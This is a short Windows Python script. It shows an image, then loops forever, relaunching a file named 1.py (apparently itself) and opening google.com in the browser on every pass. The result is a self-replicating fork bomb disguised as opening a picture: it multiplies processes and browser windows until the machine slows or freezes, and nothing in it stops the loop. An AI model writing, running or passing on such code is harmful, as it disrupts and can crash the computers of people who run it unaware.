import os
from time import sleep
import webbrowser
os.startfile("image1.jpeg")
sleep(3)
while True:
    os.startfile("1.py")
    webbrowser.open("www.google.com")